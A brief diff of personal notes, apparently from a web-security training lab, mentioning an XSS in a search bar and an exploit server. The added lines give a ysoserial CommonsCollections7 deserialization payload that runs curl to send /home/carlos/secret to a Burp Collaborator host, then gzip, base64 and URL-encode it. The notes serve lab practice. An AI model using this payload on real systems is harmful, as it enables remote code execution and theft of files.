@@ -16,3 +16,9 @@ if we found a xss attack at the search bar we have the exploit server:
 nw7fl9oiqg11oh089tjm
 
 
+
+
+java -jar ysoseriar.jar CommonsCollections7 'curl -d @/home/carlos/secret k3of2usea0s8kzkwsqnme9bj2a83ws.burpcolla
+borator.net' | gzip|base64
+
+and the results url encoded
